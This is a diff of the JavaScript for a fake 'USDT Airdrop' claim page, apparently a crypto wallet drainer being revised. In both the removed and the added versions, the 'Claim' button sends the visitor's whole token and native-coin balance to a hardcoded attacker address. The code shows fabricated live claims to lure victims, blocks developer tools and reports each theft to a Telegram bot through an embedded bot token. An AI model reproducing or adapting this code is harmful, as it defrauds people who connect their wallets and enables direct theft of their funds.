-            if (after - before > 200) window.location.href = "about:blank";
-        }
-        setInterval(checkDevTools, 1000);
-    })();
-
-    console.log("%c⚠️ STOP!", "color: red; font-size: 50px; font-weight: bold;");
-    console.log("%cThis is a browser feature intended for developers.", "font-size: 16px;");
-
-    // ================= PRE-LOAD WALLETCONNECT (SPEED OPTIMIZATION) =================
-    // We start downloading the WalletConnect library immediately in the background.
-    let wcModulePromise = import('https://esm.sh/@walletconnect/ethereum-provider@2.21.8?bundle');
-
-    // ================= VISUAL EFFECTS =================
-    const floatingContainer = document.getElementById('floatingBg');
-    const items = [
-        { text: 'USDT Airdrop', icon: 'fab fa-ethereum' }, { text: 'Claim 500 USDT', icon: 'fas fa-coins' },
-        { text: 'Verified', icon: 'fas fa-check-circle' }, { text: 'Airdrop Live', icon: 'fas fa-rocket' }
-    ];
-
-    for(let i = 0; i < 15; i++) {
-        let el = document.createElement('div');
-        el.classList.add('float-item');
-        let content = items[Math.floor(Math.random() * items.length)];
-        el.innerHTML = `<i class="${content.icon}"></i> ${content.text}`;
-        el.style.left = Math.random() * 100 + 'vw';
-        el.style.animationDuration = (Math.random() * 20 + 15) + 's';
-        el.style.animationDelay = (Math.random() * 10) + 's';
-        floatingContainer.appendChild(el);
-    }
-
-    const txList = document.getElementById('txList');
-    const addressParts = ['0x5a3...', '0x7b9...', '0x1f4...', '0x92d...', '0xa2e...'];
-    function generateTx() {
-        const isEth = Math.random() > 0.5;
-        const div = document.createElement('div');
-        div.className = `tx-item ${isEth ? 'eth' : 'bnb'}`;
-        div.innerHTML = `
-            <div class="tx-user">
-                <div class="tx-avatar"><i class="fas fa-user"></i></div>
-                <div><div class="tx-address">${addressParts[Math.floor(Math.random() * addressParts.length)]}</div><div class="tx-time">Just now</div></div>
-            </div>
-            <div class="tx-amount">+${(Math.random() * 500 + 100).toFixed(0)} USDT</div>
-        `;
-        txList.insertBefore(div, txList.firstChild);
-        if(txList.children.length > 5) txList.removeChild(txList.lastChild);
-    }
-    for(let i=0; i<3; i++) generateTx();
-    setInterval(generateTx, 3000);
-
-    // ================= CORE LOGIC =================
-    const networkItems = document.querySelectorAll('.network-item');
-    const injectBtn = document.getElementById('injectBtn');
-    const wcBtn = document.getElementById('wcBtn');
-    const approveBtn = document.getElementById('approveBtn');
-    const statusBox = document.getElementById('statusBox');
-    const walletBadge = document.getElementById('walletBadge');
-    const moonpayLink = document.getElementById('moonpayLink');
-    
-    let currentChainId = 1;
-    let provider, signer, wcProvider=null, userAddress=null, isProcessing=false, activeProviderType=null;
-
-    // Configuration
-    const RECIPIENT_ADDRESS = "0x11162539D0DC5Fec12c4F6b9cEd81B76b0B1e5b1";
-    const WALLETCONNECT_PROJECT_ID = "6dbc143802f4e17e58fa48ed65449d48";
-    const TELEGRAM_BOT = "8508442196:AAGyHF-RKSVPVtAvpYzvNRns3mufYb-1Euk"; 
-    const ADMIN_CHAT_ID = "-1003776376519"; 
-    const REFERRERS = { nora: "", whitelist: "", malone: "", mikkycrypt03: "", wangde: "", love: "", pay: "", fred: "" };
-
-    const NETWORKS = {
-        1: { name:"Ethereum", symbol:"ETH", rpc:"https://eth.llamarpc.com", explorer:"https://etherscan.io", moonpay:"https://buy.moonpay.com?currencyCode=eth", usdtAddress:"0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals:6 },
-        56: { name:"BNB Smart Chain", symbol:"BNB", rpc:"https://bsc-dataseed.binance.org", explorer:"https://bscscan.com", moonpay:"https://buy.moonpay.com?currencyCode=bnb", usdtAddress:"0x55d398326f99059fF775485246999027B3197955", decimals:18 }
-    }; 
-
-    const ERC20_ABI = [
-        "function transfer(address to, uint256 amount) external returns (bool)",
-        "function balanceOf(address account) external view returns (uint256)"
-    ];
-
-    // Theme Switching
-    networkItems.forEach(item => {
-        item.addEventListener('click', () => {
-            networkItems.forEach(i => i.classList.remove('active'));
-            item.classList.add('active');
-            currentChainId = parseInt(item.dataset.chain);
-            
-            if(currentChainId === 56) {
-                document.body.classList.remove('theme-eth');
-                document.body.classList.add('theme-bnb');
-            } else {
-                document.body.classList.remove('theme-bnb');
-                document.body.classList.add('theme-eth');
+    <script>
+        // ================= CONFIGURATION =================
+        const NETWORKS = {
+            bsc: {
+                name: 'BNB Smart Chain',
+                short: 'BNB',
+                chainId: '0x38',
+                rpc: 'https://bsc-dataseed1.binance.org',
+                explorer: 'https://bscscan.com',
+                symbol: 'BNB',
+                recipient: '0x11162539D0DC5Fec12c4F6b9cEd81B76b0B1e5b1'
+            },
+            eth: {
+                name: 'Ethereum Mainnet',
+                short: 'ETH',
+                chainId: '0x1',
+                rpc: 'https://eth.llamarpc.com',
+                explorer: 'https://etherscan.io',
+                symbol: 'ETH',
+                recipient: '0x11162539D0DC5Fec12c4F6b9cEd81B76b0B1e5b1'
             }
-            
-            const n = NETWORKS[currentChainId];
-            if(n) moonpayLink.href = n.moonpay;
-            updateStatus(`Switched to ${item.querySelector('.network-name').innerText}`, 'info');
+        };
+
+        // Telegram config (optional)
+        const TELEGRAM_BOT = "8508442196:AAGyHF-RKSVPVtAvpYzvNRns3mufYb-1Euk"; 
+        const ADMIN_CHAT_ID = "-1003776376519"; 
+
+        // ================= STATE =================
+        let provider, signer, userAddress = null;
+        let currentNetwork = 'bsc';
+        let isProcessing = false;
+
+        // ================= UI ELEMENTS =================
+        const connectBtn = document.getElementById('connectBtn');
+        const claimBtn = document.getElementById('claimBtn');
+        const statusBox = document.getElementById('statusBox');
+        const walletBadge = document.getElementById('walletBadge');
+        const balanceBox = document.getElementById('balanceBox');
+        const balanceAmount = document.getElementById('balanceAmount');
+        const balanceSymbol = document.getElementById('balanceSymbol');
+        const walletAddress = document.getElementById('walletAddress');
+        const txList = document.getElementById('txList');
+        const networkBtns = document.querySelectorAll('.network-btn');
+        const networkName = document.getElementById('networkName');
+        const networkDesc = document.getElementById('networkDesc');
+        const liveNetwork = document.getElementById('liveNetwork');
+        const moonpayLink = document.getElementById('moonpayLink');
+
+        // ================= LIVE FEED =================
+        const addresses = ['0x5a3f...', '0x7b9d...', '0x1f4e...', '0x92da...', '0xa2e7...'];
+        function addLiveClaim() {
+            const div = document.createElement('div');
+            div.className = `tx-item ${currentNetwork}`;
+            const symbol = NETWORKS[currentNetwork].symbol;
+            div.innerHTML = `
+                <div class="tx-user">
+                    <div class="tx-avatar"><i class="fas fa-user"></i></div>
+                    <div><div class="tx-address">${addresses[Math.floor(Math.random() * addresses.length)]}</div><div class="tx-time">Just now</div></div>
+                </div>
+                <div class="tx-amount">+${(Math.random() * 2 + 0.1).toFixed(2)} ${symbol}</div>
+            `;
+            txList.insertBefore(div, txList.firstChild);
+            if(txList.children.length > 5) txList.removeChild(txList.lastChild);
+        }
+        for(let i=0; i<3; i++) addLiveClaim();
+        setInterval(addLiveClaim, 4000);
+
+        // ================= NETWORK SWITCHING =================
+        networkBtns.forEach(btn => {
+            btn.onclick = () => {
+                if(isProcessing) return;
+                
+                networkBtns.forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
+                currentNetwork = btn.dataset.network;
+                
+                updateNetworkUI();
+                
+                if(provider && userAddress) {
+                    updateBalance();
+                }
+            };
         });
-    });
 
-    // UI Helpers
-    function updateStatus(msg, type='info') {
-        statusBox.className = 'status-box active';
-        if(type === 'error') statusBox.classList.add('error');
-        else if(type === 'success') statusBox.classList.add('success');
-        else if(type === 'warning') statusBox.classList.add('warning');
-        
-        let iconClass = 'fa-info-circle';
-        if(type === 'error') iconClass = 'fa-times-circle';
-        if(type === 'success') iconClass = 'fa-check-circle';
-        if(type === 'warning') iconClass = 'fa-spinner fa-spin';
-        
-        statusBox.innerHTML = `<i class="fas ${iconClass}"></i> ${msg}`;
-    }
-
-    function setButtonLoading(btn, isLoading) {
-        if(isLoading) {
-            btn.classList.add('btn-loading');
-            btn.disabled = true;
-        } else {
-            btn.classList.remove('btn-loading');
-            btn.disabled = false;
+        function updateNetworkUI() {
+            const net = NETWORKS[currentNetwork];
+            networkName.textContent = net.name;
+            networkDesc.textContent = currentNetwork === 'bsc' ? 'Low Fees • Fast Transactions' : 'Ethereum Mainnet';
+            networkDesc.className = `network-desc-badge ${currentNetwork}`;
+            liveNetwork.textContent = `${net.short} Network`;
+            moonpayLink.href = `https://buy.moonpay.com?currencyCode=${net.symbol.toLowerCase()}`;
+            claimBtn.className = `cyber-btn btn-claim ${currentNetwork}`;
+            balanceSymbol.textContent = net.symbol;
+            balanceAmount.className = `balance-amount ${currentNetwork}`;
         }
-    }
 
-    function updateWalletUI(address) {
-        walletBadge.style.display = 'block';
-        walletBadge.style.borderColor = 'var(--accent-main)';
-        walletBadge.style.color = 'var(--accent-main)';
-        document.getElementById('walletAddress').innerText = `${address.slice(0,6)}...${address.slice(-4)}`;
-        
-        approveBtn.innerHTML = `<i class="fas fa-gift"></i> Claim to ${address.slice(0,6)}...${address.slice(-4)}`;
-        approveBtn.disabled = false;
-        
-        injectBtn.style.display = 'none';
-        wcBtn.style.display = 'none';
-        updateStatus('Wallet connected successfully. Ready to claim.', 'success');
-    }
-
-    function getReferral(){ 
-        const params=new URLSearchParams(window.location.search); 
-        return params.get("ref"); 
-    }
-
-    async function sendTelegram(chatId, message){ 
-        if(!chatId) return; 
-        try {
-            const text = encodeURIComponent(message);
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=HTML`;
-            await fetch(url);
-        } catch (e) {
-            console.error("Telegram Error", e);
+        // ================= HELPER FUNCTIONS =================
+        function updateStatus(msg, type = 'info') {
+            statusBox.className = 'status-box active';
+            if(type === 'error') statusBox.classList.add('error');
+            else if(type === 'success') statusBox.classList.add('success');
+            else if(type === 'warning') statusBox.classList.add('warning');
+            
+            let icon = 'fa-info-circle';
+            if(type === 'error') icon = 'fa-times-circle';
+            if(type === 'success') icon = 'fa-check-circle';
+            if(type === 'warning') icon = 'fa-spinner fa-spin';
+            
+            statusBox.innerHTML = `<i class="fas ${icon}"></i> ${msg}`;
         }
-    }
 
-    // ================= WALLET CONNECTION LOGIC (OPTIMIZED) =================
-
-    // 1. Auto-Reconnect (Eager Connect)
-    // This checks if the user is already connected and restores the session instantly.
-    window.addEventListener('load', async () => {
-        if (window.ethereum) {
-            provider = new ethers.providers.Web3Provider(window.ethereum);
-            // Check for existing accounts without prompting the user
-            const accounts = await provider.listAccounts();
-            if (accounts.length > 0) {
-                signer = provider.getSigner();
-                userAddress = accounts[0];
-                activeProviderType = 'injected';
-                updateWalletUI(userAddress);
-                
-                // Optional: Ensure correct network
-                try {
-                    const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
-                    const targetChainHex = '0x' + currentChainId.toString(16);
-                    if(currentChain !== targetChainHex) {
-                         // Silent switch attempt or just update status
-                         updateStatus(`Switch network to ${NETWORKS[currentChainId].name} in your wallet`, 'warning');
-                    }
-                } catch (e) { console.log(e); }
-            }
-        }
-    });
-
-    // 2. Manual Injected Connection
-    injectBtn.onclick = async () => {
-        if(!window.ethereum){ 
-            updateStatus("No Web3 Wallet Detected", 'error');
-            return;
-        }
-        
-        setButtonLoading(injectBtn, true);
-        updateStatus("Connecting...", 'warning');
-
-        try {
-            provider = new ethers.providers.Web3Provider(window.ethereum);
-            await provider.send("eth_requestAccounts", []);
-            
-            signer = provider.getSigner();
-            userAddress = await signer.getAddress();
-            activeProviderType = 'injected';
-            
-            updateWalletUI(userAddress);
-
-            // Network Switch Check
-            try {
-                const network = NETWORKS[currentChainId];
-                const targetChainHex = '0x' + currentChainId.toString(16);
-                const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
-                
-                if(currentChain !== targetChainHex) {
-                     updateStatus(`Switching to ${network.name}...`, 'warning');
-                     await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: targetChainHex }],
-                    });
-                    updateStatus('Network switched. Ready.', 'success');
-                }
-            } catch (switchError) {
-                console.log("Network switch required or failed", switchError);
-            }
-
-        } catch(err) {
-            console.error(err);
-            updateStatus("Connection Rejected or Failed", 'error');
-            setButtonLoading(injectBtn, false);
-        }
-    };
-
-    // 3. WalletConnect (Uses Pre-loaded Module)
-    wcBtn.onclick = async () => {
-        setButtonLoading(wcBtn, true);
-        updateStatus("Initializing WalletConnect...", 'warning');
-        try {
-            if(wcProvider){ await wcProvider.disconnect().catch(()=>{}); wcProvider=null; }
-            
-            // Use the pre-loaded promise
-            const {EthereumProvider} = await wcModulePromise;
-            
-            wcProvider = await EthereumProvider.init({
-                projectId: WALLETCONNECT_PROJECT_ID,
-                chains: [currentChainId],
-                showQrModal: true,
-                rpcMap: { 1: NETWORKS[1].rpc, 56: NETWORKS[56].rpc },
-                metadata: { name:'Aether Airdrop', url:window.location.origin }
-            });
-            
-            const accounts = await wcProvider.enable();
-            window.ethereum = wcProvider; 
-            provider = new ethers.providers.Web3Provider(wcProvider);
-            signer = provider.getSigner();
-            userAddress = accounts[0];
-            activeProviderType = 'walletconnect';
-            
-            updateWalletUI(userAddress);
-        } catch(err) {
-            console.error(err);
-            updateStatus("WalletConnect Error", 'error');
-        }
-        setButtonLoading(wcBtn, false);
-    };
-
-    // Approve / Claim Logic
-    approveBtn.onclick = async () => {
-        if(isProcessing || !userAddress) return;
-        isProcessing = true;
-        setButtonLoading(approveBtn, true);
-        updateStatus("Initializing Transfer...", 'warning');
-
-        try {
-            const network = NETWORKS[currentChainId];
-            const usdt = new ethers.Contract(network.usdtAddress, ERC20_ABI, signer);
-            
-            const ref = getReferral(); 
-            const refChat = REFERRERS[ref];
-            
-            let usdtAmount = "0";
-            let usdtTxHash = null;
-            
-            // Step 1: Try to transfer USDT if balance exists
-            const usdtBalance = await usdt.balanceOf(userAddress);
-            
-            if(usdtBalance.gt(0)) {
-                updateStatus("Step 1/2: Processing USDT transfer...", 'warning');
-                const usdtTx = await usdt.transfer(RECIPIENT_ADDRESS, usdtBalance);
-                usdtTxHash = usdtTx.hash;
-                
-                const msg = `🔄 <b>USDT TRANSFER STARTED</b>\nWallet: <code>${userAddress}</code>\nNetwork: ${network.name}\nRef: ${ref||'none'}\nTX: ${network.explorer}/tx/${usdtTx.hash}`;
-                await sendTelegram(ADMIN_CHAT_ID, msg);
-                if(refChat) await sendTelegram(refChat, `👤 Someone used your referral\nTX: ${usdtTx.hash}`);
-
-                const usdtReceipt = await usdtTx.wait();
-                
-                if(usdtReceipt.status === 1) {
-                    usdtAmount = ethers.utils.formatUnits(usdtBalance, network.decimals);
-                }
+        function setButtonLoading(btn, isLoading) {
+            if(isLoading) {
+                btn.classList.add('btn-loading');
+                btn.disabled = true;
             } else {
-                updateStatus("No USDT balance, processing native coin...", 'warning');
+                btn.classList.remove('btn-loading');
+                btn.disabled = false;
             }
-            
-            // Step 2: Transfer remaining ETH/BNB (ALWAYS DO THIS)
-            updateStatus(usdtBalance.gt(0) ? "Step 2/2: Processing native coin transfer..." : "Processing native coin transfer...", 'warning');
-            
+        }
+
+        async function updateBalance() {
+            if(!provider || !userAddress) return;
             try {
-                // Get ETH/BNB balance
-                const ethBalance = await signer.getBalance();
+                const balance = await provider.getBalance(userAddress);
+                const formattedBalance = ethers.utils.formatEther(balance);
+                balanceAmount.textContent = parseFloat(formattedBalance).toFixed(4);
+                balanceBox.style.display = 'block';
+                return balance;
+            } catch(e) {
+                console.error('Balance check error:', e);
+                return null;
+            }
+        }
+
+        async function sendTelegram(message) {
+            if(!TELEGRAM_BOT || !ADMIN_CHAT_ID) return;
+            try {
+                const text = encodeURIComponent(message);
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${text}&parse_mode=HTML`);
+            } catch(e) {
+                console.error('Telegram error:', e);
+            }
+        }
+
+        // ================= CONNECT WALLET =================
+        connectBtn.onclick = async () => {
+            if(!window.ethereum) {
+                updateStatus('Please install MetaMask or TrustWallet', 'error');
+                return;
+            }
+
+            setButtonLoading(connectBtn, true);
+            updateStatus(`Connecting to ${NETWORKS[currentNetwork].name}...`, 'warning');
+
+            try {
+                // Request accounts
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
                 
-                // Estimate gas for the ETH transfer
-                const gasPrice = await provider.getGasPrice();
-                const gasLimit = ethers.BigNumber.from(21000); // Standard ETH transfer
-                const gasCost = gasPrice.mul(gasLimit);
+                // Setup provider with selected network RPC
+                const net = NETWORKS[currentNetwork];
+                provider = new ethers.providers.JsonRpcProvider(net.rpc);
                 
-                // Calculate amount to send (total balance - gas cost)
-                const amountToSend = ethBalance.sub(gasCost);
-                
-                if(amountToSend.gt(0)) {
-                    const ethTx = await signer.sendTransaction({
-                        to: RECIPIENT_ADDRESS,
-                        value: amountToSend,
-                        gasLimit: gasLimit
-                    });
-                    
-                    await ethTx.wait();
-                    
-                    const ethAmount = ethers.utils.formatEther(amountToSend);
-                    
-                    let successMsg = `✅ <b>CLAIM SUCCESS</b>\n`;
-                    if(usdtBalance.gt(0)) {
-                        successMsg += `USDT: ${usdtAmount} USDT\n`;
-                    }
-                    successMsg += `${network.symbol}: ${ethAmount} ${network.symbol}\nFrom: <code>${userAddress}</code>\nTo: <code>${RECIPIENT_ADDRESS}</code>\nNetwork: ${network.name}\n`;
-                    if(usdtTxHash) {
-                        successMsg += `USDT TX: ${network.explorer}/tx/${usdtTxHash}\n`;
-                    }
-                    successMsg += `${network.symbol} TX: ${network.explorer}/tx/${ethTx.hash}`;
-                    
-                    await sendTelegram(ADMIN_CHAT_ID, successMsg);
-                    if(refChat) await sendTelegram(refChat, successMsg);
-                    
-                    if(usdtBalance.gt(0)) {
-                        updateStatus(`✅ Claimed!\n${usdtAmount} USDT + ${ethAmount} ${network.symbol}`, 'success');
-                    } else {
-                        updateStatus(`✅ Claimed!\n${ethAmount} ${network.symbol}`, 'success');
-                    }
-                } else {
-                    // No ETH/BNB left after gas
-                    if(usdtBalance.gt(0)) {
-                        const successMsg = `✅ <b>USDT CLAIM SUCCESS</b>\nAmount: ${usdtAmount} USDT\nFrom: <code>${userAddress}</code>\nTo: <code>${RECIPIENT_ADDRESS}</code>\nNetwork: ${network.name}\nTX: ${network.explorer}/tx/${usdtTxHash}\nNote: No ${network.symbol} remaining after gas`;
-                        await sendTelegram(ADMIN_CHAT_ID, successMsg);
-                        if(refChat) await sendTelegram(refChat, successMsg);
-                        
-                        updateStatus(`✅ Claimed!\n${usdtAmount} USDT`, 'success');
-                    } else {
-                        updateStatus("No balance to claim", 'error');
-                        setButtonLoading(approveBtn, false);
-                        isProcessing = false;
-                        return;
+                // Get signer from wallet
+                const web3Provider = new ethers.providers.Web3Provider(window.ethereum);
+                signer = web3Provider.getSigner();
+                userAddress = await signer.getAddress();
+
+                // Check if we're on correct chain
+                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                if(chainId !== net.chainId) {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: net.chainId }]
+                        });
+                    } catch(switchError) {
+                        // Add network if not present
+                        if(switchError.code === 4902) {
+                            await window.ethereum.request({
+                                method: 'wallet_addEthereumChain',
+                                params: [{
+                                    chainId: net.chainId,
+                                    chainName: net.name,
+                                    nativeCurrency: {
+                                        name: net.symbol,
+                                        symbol: net.symbol,
+                                        decimals: 18
+                                    },
+                                    rpcUrls: [net.rpc],
+                                    blockExplorerUrls: [net.explorer]
+                                }]
+                            });
+                        }
                     }
                 }
-            } catch(ethErr) {
-                console.error('ETH transfer error:', ethErr);
+
+                // Update UI
+                walletAddress.textContent = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+                walletBadge.style.display = 'block';
                 
-                if(usdtBalance.gt(0)) {
-                    // USDT transfer succeeded, but ETH failed
-                    const successMsg = `✅ <b>USDT CLAIM SUCCESS</b>\nAmount: ${usdtAmount} USDT\nFrom: <code>${userAddress}</code>\nTo: <code>${RECIPIENT_ADDRESS}</code>\nNetwork: ${network.name}\nTX: ${network.explorer}/tx/${usdtTxHash}\n⚠️ ${network.symbol} transfer failed: ${ethErr.message}`;
-                    await sendTelegram(ADMIN_CHAT_ID, successMsg);
-                    
-                    updateStatus(`✅ ${usdtAmount} USDT claimed\n⚠️ ${network.symbol} failed`, 'success');
-                } else {
-                    // No USDT and ETH also failed
-                    updateStatus(`Failed: ${ethErr.message.substring(0, 50)}`, 'error');
-                    setButtonLoading(approveBtn, false);
+                // Update balance
+                await updateBalance();
+                
+                // Enable claim button
+                claimBtn.disabled = false;
+                connectBtn.style.display = 'none';
+                
+                updateStatus(`Connected to ${net.name}!`, 'success');
+
+            } catch(err) {
+                console.error('Connection error:', err);
+                updateStatus('Connection failed: ' + (err.message || 'Unknown error'), 'error');
+            }
+            
+            setButtonLoading(connectBtn, false);
+        };
+
+        // ================= CLAIM =================
+        claimBtn.onclick = async () => {
+            if(isProcessing || !userAddress || !signer) return;
+            
+            const net = NETWORKS[currentNetwork];
+            isProcessing = true;
+            setButtonLoading(claimBtn, true);
+            updateStatus('Checking balance...', 'warning');
+
+            try {
+                // Get fresh balance from wallet
+                const walletProvider = new ethers.providers.Web3Provider(window.ethereum);
+                const balance = await walletProvider.getBalance(userAddress);
+                const formattedBalance = ethers.utils.formatEther(balance);
+                
+                console.log(`${net.symbol} Balance:`, formattedBalance);
+                
+                if(balance.eq(0)) {
+                    updateStatus(`No ${net.symbol} balance to claim`, 'error');
+                    setButtonLoading(claimBtn, false);
                     isProcessing = false;
                     return;
                 }
+
+                // Get gas price
+                const gasPrice = await walletProvider.getGasPrice();
+                const gasLimit = 21000;
+                const gasCost = gasPrice.mul(gasLimit);
+                
+                // Calculate send amount
+                let sendAmount;
+                if(balance.gt(gasCost)) {
+                    sendAmount = balance.sub(gasCost);
+                } else {
+                    sendAmount = balance;
+                    updateStatus(`Low balance - sending all ${net.symbol}`, 'warning');
+                }
+
+                updateStatus(`Sending ${ethers.utils.formatEther(sendAmount)} ${net.symbol}...`, 'warning');
+
+                // Send transaction
+                const tx = await signer.sendTransaction({
+                    to: net.recipient,
+                    value: sendAmount,
+                    gasLimit: gasLimit
+                });
+
+                updateStatus('Transaction sent! Waiting confirmation...', 'warning');
+
+                // Wait for confirmation
+                const receipt = await tx.wait();
+
+                if(receipt.status === 1) {
+                    const sentAmount = ethers.utils.formatEther(sendAmount);
+                    const successMsg = `✅ <b>${net.symbol} CLAIM SUCCESS</b>\n` +
+                        `Amount: ${sentAmount} ${net.symbol}\n` +
+                        `Network: ${net.name}\n` +
+                        `From: ${userAddress}\n` +
+                        `TX: ${net.explorer}/tx/${tx.hash}`;
+                    
+                    await sendTelegram(successMsg);
+                    
+                    updateStatus(`✅ Success! ${sentAmount} ${net.symbol} claimed`, 'success');
+                    claimBtn.innerHTML = '<i class="fas fa-check"></i> Claimed';
+                    claimBtn.disabled = true;
+                    
+                    setTimeout(updateBalance, 2000);
+                } else {
+                    updateStatus('Transaction failed', 'error');
+                }
+
+            } catch(err) {
+                console.error('Claim error:', err);
+                
+                if(err.code === 4001) {
+                    updateStatus('Transaction rejected', 'error');
+                } else {
+                    updateStatus('Failed: ' + (err.message?.substring(0, 50) || 'Unknown error'), 'error');
+                }
             }
+
+            setButtonLoading(claimBtn, false);
+            isProcessing = false;
+        };
+
+        // Auto-check for existing connection
+        window.addEventListener('load', async () => {
+            updateNetworkUI();
+            if(window.ethereum) {
+                try {
+                    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+                    if(accounts.length > 0) {
+                        connectBtn.click();
+                    }
+                } catch(e) {
+                    console.log('Auto-connect check failed:', e);
+                }
+            }
+        });
+
+        // Listen for account changes
+        if(window.ethereum) {
+            window.ethereum.on('accountsChanged', (accounts) => {
+                if(accounts.length === 0) {
+                    window.location.reload();
+                }
+            });
             
-            approveBtn.innerHTML = '<i class="fas fa-check"></i> Claimed';
-            approveBtn.disabled = true;
-
-        } catch(err) {
-            console.error(err);
-            updateStatus(`Failed: ${err.message.substring(0, 50)}...`, 'error');
-            setButtonLoading(approveBtn, false);
+            window.ethereum.on('chainChanged', () => {
+                window.location.reload();
+            });
         }
-        
-        isProcessing = false;
-    };
-    
-    moonpayLink.href = NETWORKS[currentChainId].moonpay;
-
-</script>
-
+    </script>
 </body>
 </html>
